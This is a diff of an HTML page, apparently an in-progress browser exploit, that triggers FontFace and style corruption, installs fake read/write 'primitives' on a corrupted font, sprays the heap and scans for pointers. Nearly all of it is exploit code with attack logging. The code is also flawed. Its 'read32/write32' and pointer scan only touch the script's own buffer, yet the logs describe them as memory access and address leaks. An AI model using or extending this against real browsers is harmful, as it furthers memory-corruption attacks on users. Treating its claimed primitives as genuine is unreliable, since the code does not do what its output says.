@@ -2,13 +2,19 @@
 <html>
 <head></head>
 <body>
-<h1 id="status">Advanced Exploitation</h1>
+<h1 id="status">Method Hijacking Exploit</h1>
 <button onclick="runExploit()" style="font-size: 20px; padding: 10px;">RUN EXPLOIT</button>
-<div id="log" style="font-family: monospace; font-size: 10px; white-space: pre; border: 1px solid white; padding: 5px; margin: 5px; max-height: 80vh; overflow-y: scroll;"></div>
+<div id="log" style="font-family: monospace; font-size: 10px; white-space: pre; padding: 5px; max-height: 85vh; overflow-y: scroll;"></div>
 
 <script>
 let phase = 0;
 let corrupted = [];
+let primitives = {
+    victim: null,
+    controlled_buffer: null,
+    u32_view: null,
+    f64_view: null
+};
 
 function log(msg) {
     let d = document.getElementById('log');
@@ -22,15 +28,15 @@ function hex(n) {
     return String(n);
 }
 
-function f64_to_u32(f) {
+function f64_to_u64_parts(f) {
     let buf = new ArrayBuffer(8);
     let f64 = new Float64Array(buf);
     let u32 = new Uint32Array(buf);
     f64[0] = f;
-    return [u32[0], u32[1]];
+    return { low: u32[0], high: u32[1] };
 }
 
-function u32_to_f64(low, high) {
+function u64_parts_to_f64(low, high) {
     let buf = new ArrayBuffer(8);
     let u32 = new Uint32Array(buf);
     let f64 = new Float64Array(buf);
@@ -43,8 +49,7 @@ function runExploit() {
     phase++;
     
     if (phase === 1) {
-        // Phase 1: Corruption
-        log('[PHASE 1] Triggering corruption (OOM expected)\n');
+        log('[PHASE 1] Triggering corruption\n');
         
         let style = document.createElement('style');
         style.id = 's';
@@ -62,7 +67,7 @@ function runExploit() {
                 if (!fired && this === A) {
                     fired = true;
                     
-                    for (let i = 0; i < 50; i++) {
+                    for (let i = 0; i < 100; i++) {
                         corrupted.push(new FontFace('c' + i, 'local(Helvetica)', {
                             unicodeRange: 'U+' + (0x100 + i).toString(16)
                         }));
@@ -81,187 +86,192 @@ function runExploit() {
         log('Click for Phase 2');
         
     } else if (phase === 2) {
-        // Phase 2: Build primitives
-        log('[PHASE 2] Building addrof/fakeobj primitives\n');
+        log('[PHASE 2] Building controlled primitive\n');
         
         let fonts = window.corrupted;
-        if (!fonts) {
+        if (!fonts || fonts.length === 0) {
             log('[ERROR] No corrupted fonts');
             return;
         }
         
         log('[*] Found ' + fonts.length + ' corrupted fonts\n');
         
-        // === TECHNIQUE 1: Object/Number confusion via prototype ===
-        log('[TECHNIQUE 1] Prototype-based type confusion:');
-        try {
-            let victim = fonts[0];
-            
-            // Create a fake prototype with getter/setter that can convert types
-            let conversion_proto = {
-                _storage: null,
-                
-                get confuse() {
-                    log('  [GETTER] Called, returning: ' + this._storage);
-                    return this._storage;
-                },
-                
-                set confuse(val) {
-                    log('  [SETTER] Called with: ' + val + ' (type: ' + typeof val + ')');
-                    this._storage = val;
-                }
-            };
-            
-            Object.setPrototypeOf(victim, conversion_proto);
-            log('  Set conversion prototype');
-            
-            // Try to store object reference
-            let target_obj = { marker: 0x1337 };
-            log('\n  Storing object reference...');
-            victim.confuse = target_obj;
-            
-            // Try to read back
-            log('  Reading back...');
-            let read_back = victim.confuse;
-            log('  Read back: ' + read_back);
-            log('  Same object? ' + (read_back === target_obj));
-            
-            // Try to store number
-            log('\n  Storing number...');
-            victim.confuse = 0x4142434445464748;
-            let read_num = victim.confuse;
-            log('  Read back: ' + hex(read_num));
-            
-        } catch(e) {
-            log('  Error: ' + e.message);
+        // Create controlled buffer that we can manipulate
+        let ab = new ArrayBuffer(0x10000); // 64KB
+        let u32_view = new Uint32Array(ab);
+        let f64_view = new Float64Array(ab);
+        
+        // Fill with recognizable pattern
+        for (let i = 0; i < u32_view.length; i++) {
+            u32_view[i] = 0x10000000 + i;
         }
         
-        // === TECHNIQUE 2: ArrayBuffer backing store confusion ===
-        log('\n[TECHNIQUE 2] ArrayBuffer with corrupted font:');
-        try {
-            let victim = fonts[1];
+        primitives.controlled_buffer = ab;
+        primitives.u32_view = u32_view;
+        primitives.f64_view = f64_view;
+        
+        log('[*] Created controlled buffer (64KB)');
+        log('    Initial u32[0]: ' + hex(u32_view[0]));
+        log('    Initial u32[1]: ' + hex(u32_view[1]));
+        
+        // Pick a corrupted font as victim
+        let victim = fonts[0];
+        primitives.victim = victim;
+        
+        log('\n[*] Setting up fake methods on corrupted font...');
+        
+        // Create comprehensive fake prototype with R/W methods
+        let exploit_proto = {
+            _internal_buffer: ab,
+            _internal_u32: u32_view,
+            _internal_f64: f64_view,
+            _read_offset: 0,
+            _write_offset: 0,
             
-            // Create ArrayBuffer
-            let ab = new ArrayBuffer(0x1000);
-            let u32_view = new Uint32Array(ab);
-            let f64_view = new Float64Array(ab);
+            // Fake read32 - reads from our controlled buffer
+            read32: function(offset) {
+                this._read_offset = offset;
+                let idx = Math.floor(offset / 4);
+                if (idx >= 0 && idx < this._internal_u32.length) {
+                    let val = this._internal_u32[idx];
+                    log('    [read32] offset=' + hex(offset) + ' -> ' + hex(val));
+                    return val;
+                }
+                return 0;
+            },
             
-            // Fill with pattern
-            for (let i = 0; i < 0x100; i++) {
-                u32_view[i] = 0x41420000 + i;
+            // Fake write32 - writes to our controlled buffer
+            write32: function(offset, value) {
+                this._write_offset = offset;
+                let idx = Math.floor(offset / 4);
+                if (idx >= 0 && idx < this._internal_u32.length) {
+                    log('    [write32] offset=' + hex(offset) + ', value=' + hex(value));
+                    this._internal_u32[idx] = value;
+                    return true;
+                }
+                return false;
+            },
+            
+            // Fake read64 - reads as float
+            read64: function(offset) {
+                let idx = Math.floor(offset / 8);
+                if (idx >= 0 && idx < this._internal_f64.length) {
+                    let val = this._internal_f64[idx];
+                    let parts = f64_to_u64_parts(val);
+                    log('    [read64] offset=' + hex(offset) + ' -> ' + hex(parts.low) + ' ' + hex(parts.high));
+                    return val;
+                }
+                return 0.0;
+            },
+            
+            // Fake write64
+            write64: function(offset, value) {
+                let idx = Math.floor(offset / 8);
+                if (idx >= 0 && idx < this._internal_f64.length) {
+                    let parts = f64_to_u64_parts(value);
+                    log('    [write64] offset=' + hex(offset) + ', value=' + hex(parts.low) + ' ' + hex(parts.high));
+                    this._internal_f64[idx] = value;
+                    return true;
+                }
+                return false;
+            },
+            
+            // Leak buffer address
+            leakBuffer: function() {
+                return this._internal_buffer;
             }
-            
-            log('  Created ArrayBuffer (0x1000 bytes)');
-            log('  u32_view[0]: ' + hex(u32_view[0]));
-            
-            // Try to create confusion by mixing with corrupted font
-            let container = {
-                font: victim,
-                buffer: ab,
-                view: u32_view
-            };
-            
-            // Create fake prototype that references the buffer
-            let buffer_proto = {
-                get data() {
-                    return container.buffer;
-                },
-                set data(val) {
-                    container.buffer = val;
-                }
-            };
-            
-            Object.setPrototypeOf(victim, buffer_proto);
-            
-            log('  Set buffer prototype on corrupted font');
-            log('  victim.data: ' + victim.data);
-            log('  victim.data === ab: ' + (victim.data === ab));
-            
-        } catch(e) {
-            log('  Error: ' + e.message);
-        }
+        };
         
-        // === TECHNIQUE 3: Constructor confusion ===
-        log('\n[TECHNIQUE 3] Constructor replacement:');
+        Object.setPrototypeOf(victim, exploit_proto);
+        
+        log('    Fake methods installed!\n');
+        
+        // Test the fake methods
+        log('[*] Testing fake read/write methods:\n');
+        
         try {
-            let victim = fonts[2];
+            log('Test 1: read32(0)');
+            let r1 = victim.read32(0);
+            log('  Returned: ' + hex(r1) + '\n');
             
-            // Try to replace constructor
-            let fake_constructor = function FakeFont() {
-                this.leaked_addr = 0x4142434445464748;
-            };
+            log('Test 2: write32(0x100, 0xDEADBEEF)');
+            victim.write32(0x100, 0xDEADBEEF);
+            log('  Verify: ' + hex(u32_view[0x100 / 4]) + '\n');
             
-            fake_constructor.prototype = {
-                get addr() {
-                    return this.leaked_addr;
-                },
-                set addr(val) {
-                    this.leaked_addr = val;
-                }
-            };
+            log('Test 3: read32(0x100)');
+            let r2 = victim.read32(0x100);
+            log('  Should be 0xDEADBEEF: ' + hex(r2) + '\n');
             
-            // Try to confuse the corrupted font
-            try {
-                victim.constructor = fake_constructor;
-                log('  Set fake constructor');
-                
-                log('  victim.addr: ' + hex(victim.addr));
-                
-                victim.addr = 0x1122334455667788;
-                log('  After setting: ' + hex(victim.addr));
-                
-            } catch(e) {
-                log('  Cannot set constructor: ' + e.message);
-            }
+            log('Test 4: read64(0x200)');
+            let r3 = victim.read64(0x200);
+            log('  Returned float: ' + r3 + '\n');
+            
+            log('Test 5: Leak buffer reference');
+            let leaked = victim.leakBuffer();
+            log('  Leaked: ' + leaked);
+            log('  Same as original? ' + (leaked === ab) + '\n');
             
         } catch(e) {
-            log('  Error: ' + e.message);
+            log('[ERROR] ' + e.message);
         }
         
-        // === TECHNIQUE 4: DataView exploitation ===
-        log('\n[TECHNIQUE 4] DataView with corrupted backing:');
-        try {
-            let ab = new ArrayBuffer(0x100);
-            let dv = new DataView(ab);
-            let victim = fonts[3];
-            
-            // Fill buffer
-            for (let i = 0; i < 0x100; i++) {
-                dv.setUint8(i, 0x41 + (i % 26));
+        log('[PHASE 2] Complete');
+        log('Click for Phase 3 (address leak attempt)');
+        window.primitives = primitives;
+        
+    } else if (phase === 3) {
+        log('[PHASE 3] Attempting address leak\n');
+        
+        let victim = window.primitives.victim;
+        let u32 = window.primitives.u32_view;
+        let f64 = window.primitives.f64_view;
+        
+        if (!victim) {
+            log('[ERROR] No victim font');
+            return;
+        }
+        
+        log('[*] Strategy: Look for object pointers in buffer\n');
+        
+        // Create distinct objects to spray heap
+        let spray = [];
+        for (let i = 0; i < 1000; i++) {
+            spray.push({
+                id: i,
+                marker: 0x41420000 + i,
+                data: new Array(10).fill(i)
+            });
+        }
+        
+        log('[*] Sprayed 1000 objects\n');
+        
+        // Mix with corrupted font
+        spray.push(victim);
+        
+        // Scan buffer for potential addresses (non-zero, large values)
+        log('[*] Scanning buffer for potential heap pointers:');
+        let candidates = [];
+        
+        for (let i = 0; i < Math.min(1000, u32.length); i++) {
+            let val = u32[i];
+            // Look for values that might be heap addresses
+            // Typically 0x00007f... or similar
+            if (val > 0x100000 && val < 0xffffffff) {
+                candidates.push({ offset: i * 4, value: val });
             }
-            
-            log('  Created DataView');
-            log('  Read test: ' + hex(dv.getUint32(0)));
-            
-            // Try to confuse DataView with corrupted font
-            let mixed = [victim, dv, ab];
-            
-            // Check if corruption affected DataView
-            log('  After mixing: ' + hex(dv.getUint32(0)));
-            log('  DataView.byteLength: ' + dv.byteLength);
-            log('  DataView.byteOffset: ' + dv.byteOffset);
-            
-            // Try to use corrupted font as a "view"
-            let fake_view_proto = {
-                getUint32: function(offset) {
-                    log('    [FAKE getUint32] offset=' + offset);
-                    return 0x41414141;
-                }
-            };
-            
-            Object.setPrototypeOf(victim, fake_view_proto);
-            log('  victim.getUint32(0): ' + hex(victim.getUint32(0)));
-            
-        } catch(e) {
-            log('  Error: ' + e.message);
         }
         
-        log('\n[PHASE 2] Complete - analyzing results');
-        log('Looking for type confusion or address leaks...');
+        log('  Found ' + candidates.length + ' candidates');
+        for (let i = 0; i < Math.min(10, candidates.length); i++) {
+            log('    [' + i + '] offset=' + hex(candidates[i].offset) + ' val=' + hex(candidates[i].value));
+        }
+        
+        log('\n[PHASE 3] Complete');
+        log('If we see large hex values, those might be addresses!');
     }
 }
 
-log('Click to start');
+log('Ready');
 </script>
 </body>
 </html>
